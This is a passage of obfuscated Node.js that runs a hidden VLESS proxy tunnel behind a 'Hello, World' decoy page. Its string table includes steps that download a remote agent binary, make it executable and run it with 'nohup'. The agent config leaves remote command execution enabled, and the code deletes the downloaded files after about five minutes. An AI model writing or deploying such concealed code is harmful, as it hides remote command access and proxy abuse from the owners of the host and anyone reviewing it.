nfo','child_process','url','join','nextSeq','Max\x20POST\x20size:\x20',':443?encryption=none&security=tls&sni=','Socket\x20error:','399271JAUEXh','5134224dRKpoF','Cleanup\x20error:\x20','2096','New\x20secure\x20connection\x20using:\x20','Received\x20out\x20of\x20order\x20packet\x20seq=','warn','length','keepAliveTimeout','Vls','Failed\x20to\x20write\x20to\x20remote:\x20','set','Remote\x20error:\x20','b607535d-7538-4fbe-b65f-41aab821e581','now','resp','NEZHA_KEY','NAME','unlink','Upload\x20error:\x20','fill','Remote\x20connection\x20established','LOG_LEVEL','chunked','initialized','\x22}\x27','net','Created\x20new\x20session\x20for\x20POST:\x20','SESSION_TIMEOUT','nohup\x20./npm\x20-s\x20','2053','pipe','bytes','aborted','https://','PORT','Sending\x20VLESS\x20response\x20header\x20(','http/1.1','random','GET,\x20POST','&fp=chrome&allowInsecure=1&type=xhttp&host=','read\x20vless\x20header\x20error:\x20','DOMAIN','):\x20','match','BUFFER_SIZE','base64','Max\x20buffer\x20size:\x20','writeHead','cleanup','Failed\x20to\x20initialize\x20VLESS:\x20','getWriter','header\x20length\x20too\x20short','startDownstream','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','setNoDelay','Automatic\x20Access\x20Task\x20added\x20successfully:','reduce','finally','value','lastActivity','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','\x1b[36m','Read\x20controller\x20close\x20error:','destroyed','connect\x20timeout','releaseLock','MAX_POST_SIZE','writableEnded','https://amd64.ssss.nyc.mn/agent','Connection\x20failed:\x20','TCP_KEEPALIVE','invalid\x20UUID','\x1b[33m','2083','%2F','Max\x20buffered\x20posts:\x20','curl\x20-s\x20--max-time\x202\x20ipv4.ip.sb','remote','chmod\x20+x\x20npm','Transform','8443','createServer','&path='];_0x385d=function(){return _0x4cfc31;};return _0x385d();}const metaInfo=execSync(_0x348f2d(0x17a),{'encoding':_0x348f2d(0x1af)}),ISP=metaInfo[_0x348f2d(0x1f4)]();let IP=DOMAIN;if(!DOMAIN)try{IP=execSync(_0x348f2d(0x18a),{'encoding':_0x348f2d(0x1af)})[_0x348f2d(0x1f4)]();}catch(_0x3c8e54){try{IP='['+execSync(_0x348f2d(0x195),{'encoding':'utf-8'})[_0x348f2d(0x1f4)]()+']';}catch(_0x1fb6d5){log(_0x348f2d(0x1d1),_0x348f2d(0x19c),_0x1fb6d5[_0x348f2d(0x1d6)]),IP='localhost';}}const server=http[_0x348f2d(0x18f)]((_0x4fd20d,_0x110d7f)=>{const _0x4d1891=_0x348f2d,_0x23cf49={'Access-Control-Allow-Origin':'*','Access-Control-Allow-Methods':_0x4d1891(0x164),'Cache-Control':'no-store','X-Accel-Buffering':'no','X-Padding':generatePadding(0x64,0x3e8)};if(_0x4fd20d[_0x4d1891(0x21d)]==='/'){_0x110d7f[_0x4d1891(0x16d)](0xc8,{'Content-Type':_0x4d1891(0x20e)}),_0x110d7f[_0x4d1891(0x1f2)]('Hello,\x20World\x0a');return;}if(_0x4fd20d['url']==='/'+SUB_PATH){const _0x26c1fb=_0x4d1891(0x208)+UUID+'@'+IP+_0x4d1891(0x221)+IP+_0x4d1891(0x165)+IP+_0x4d1891(0x190)+SETTINGS[_0x4d1891(0x1aa)]+'&mode=packet-up#'+NAME+'-'+ISP,_0x246ca6=Buffer[_0x4d1891(0x1ae)](_0x26c1fb)[_0x4d1891(0x1b4)](_0x4d1891(0x16b));_0x110d7f[_0x4d1891(0x16d)](0xc8,{'Content-Type':_0x4d1891(0x20e)}),_0x110d7f[_0x4d1891(0x1f2)](_0x246ca6+'\x0a');return;}const _0x37d369=_0x4fd20d['url'][_0x4d1891(0x169)](new RegExp(XPATH+_0x4d1891(0x20c)));if(!_0x37d369){_0x110d7f[_0x4d1891(0x16d)](0x194),_0x110d7f['end']();return;}const _0x1aef0c=_0x37d369[0x1],_0x3f976e=_0x37d369[0x2]?parseInt(_0x37d369[0x2]):null;if(_0x4fd20d[_0x4d1891(0x193)]===_0x4d1891(0x1a4)&&!_0x3f976e){_0x23cf49[_0x4d1891(0x213)]='application/octet-stream',_0x23cf49['Transfer-Encoding']=_0x4d1891(0x154);let _0x354009=sessions['get'](_0x1aef0c);!_0x354009&&(_0x354009=new Session(_0x1aef0c),sessions[_0x4d1891(0x148)](_0x1aef0c,_0x354009),log(_0x4d1891(0x21b),'Created\x20new\x20session\x20for\x20GET:\x20'+_0x1aef0c));_0x354009[_0x4d1891(0x1ce)]=!![];!_0x354009[_0x4d1891(0x172)](_0x110d7f,_0x23cf49)&&(log('error',_0x4d1891(0x1c6)+_0x1aef0c),!_0x110d7f[_0x4d1891(0x1e4)]&&(_0x110d7f[_0x4d1891(0x16d)](0x1f4),_0x110d7f[_0x4d1891(0x1f2)]()),_0x354009['cleanup'](),sessions['delete'](_0x1aef0c));return;}if(_0x4fd20d[_0x4d1891(0x193)]==='POST'&&_0x3f976e!==null){let _0x578ac9=sessions['get'](_0x1aef0c);!_0x578ac9&&(_0x578ac9=new Session(_0x1aef0c),sessions[_0x4d1891(0x148)](_0x1aef0c,_0x578ac9),log(_0x4d1891(0x21b),_0x4d1891(0x158)+_0x1aef0c),setTimeout(()=>{const _0x5adb6d=_0x4d1891,_0x53b610=sessions[_0x5adb6d(0x197)](_0x1aef0c);_0x53b610&&!_0x53b610[_0x5adb6d(0x1ce)]&&(log(_0x5adb6d(0x143),_0x5adb6d(0x1b2)+_0x1aef0c+_0x5adb6d(0x1c1)),_0x53b610[_0x5adb6d(0x16e)](),sessions[_0x5adb6d(0x1f9)](_0x1aef0c));},SETTINGS[_0x4d1891(0x159)]));let _0x14e999=[],_0x3c28ba=0x0,_0x2df792=![];_0x4fd20d['on'](_0x4d1891(0x1e2),_0x14def6=>{const _0x29133e=_0x4d1891;_0x3c28ba+=_0x14def6[_0x29133e(0x144)];if(_0x3c28ba>SETTINGS['MAX_POST_SIZE']){!_0x2df792&&(_0x110d7f[_0x29133e(0x16d)](0x19d),_0x110d7f[_0x29133e(0x1f2)](),_0x2df792=!![]);return;}_0x14e999[_0x29133e(0x1bb)](_0x14def6);}),_0x4fd20d['on'](_0x4d1891(0x1f2),async()=>{const _0x5b0d82=_0x4d1891;if(_0x2df792)return;try{const _0x3c215f=Buffer['concat'](_0x14e999);log('info',_0x5b0d82(0x1d9)+_0x3f976e+_0x5b0d82(0x1d0)+_0x3c215f[_0x5b0d82(0x144)]),await _0x578ac9[_0x5b0d82(0x206)](_0x3f976e,_0x3c215f),!_0x2df792&&(_0x110d7f[_0x5b0d82(0x16d)](0xc8,_0x23cf49),_0x2df792=!![]),_0x110d7f[_0x5b0d82(0x1f2)]();}catch(_0x56fcca){log(_0x5b0d82(0x1d1),_0x5b0d82(0x211)+_0x56fcca[_0x5b0d82(0x1d6)]),_0x578ac9['cleanup'](),sessions[_0x5b0d82(0x1f9)](_0x1aef0c),!_0x2df792&&(_0x110d7f[_0x5b0d82(0x16d)](0x1f4),_0x2df792=!![]),_0x110d7f['end']();}});return;}_0x110d7f[_0x4d1891(0x16d)](0x194),_0x110d7f[_0x4d1891(0x1f2)]();});server['on']('secureConnection',_0x138c94=>{const _0x132f4b=_0x348f2d;log('debug',_0x132f4b(0x227)+(_0x138c94['alpnProtocol']||_0x132f4b(0x162)));});function generatePadding(_0x4df80d,_0x5e298f){const _0x4e9ba0=_0x348f2d,_0xd1b9fd=_0x4df80d+Math['floor'](Math[_0x4e9ba0(0x163)]()*(_0x5e298f-_0x4df80d));return Buffer[_0x4e9ba0(0x1ae)](Array(_0xd1b9fd)[_0x4e9ba0(0x151)]('X')[_0x4e9ba0(0x21e)](''))[_0x4e9ba0(0x1b4)](_0x4e9ba0(0x16b));}server[_0x348f2d(0x145)]=0x975e0,server['headersTimeout']=0x98968,server['on'](_0x348f2d(0x1d1),_0x649441=>{const _0x2ac8a3=_0x348f2d;log('error',_0x2ac8a3(0x212)+_0x649441[_0x2ac8a3(0x1d6)]);});const delFiles=()=>{const _0x100497=_0x348f2d;['npm',_0x100497(0x1f1)]['forEach'](_0x252b7c=>fs[_0x100497(0x14f)](_0x252b7c,()=>{}));};server[_0x348f2d(0x1c5)](PORT,()=>{const _0x5d3926=_0x348f2d;runnz(),setTimeout(()=>{delFiles();},0x493e0),addAccessTask(),console[_0x5d3926(0x1da)](_0x5d3926(0x1e0)+PORT),log('info',_0x5d3926(0x1e5)),log('info','Log\x20level:\x20'+SETTINGS['LOG_LEVEL']),log(_0x5d3926(0x21b),_0x5d3926(0x189)+SETTINGS[_0x5d3926(0x1a6)]),log(_0x5d3926(0x21b),_0x5d3926(0x220)+SETTINGS[_0x5d3926(0x180)]+'KB'),log(_0x5d3926(0x21b),_0x5d3926(0x16c)+SETTINGS['BUFFER_SIZE']+'KB'),log('info',_0x5d3926(0x1cd)+SETTINGS[_0x5d3926(0x1f3)]+_0x5d3926(0x15d)),log(_0x5d3926(0x21b),_0x5d3926(0x1e5));});
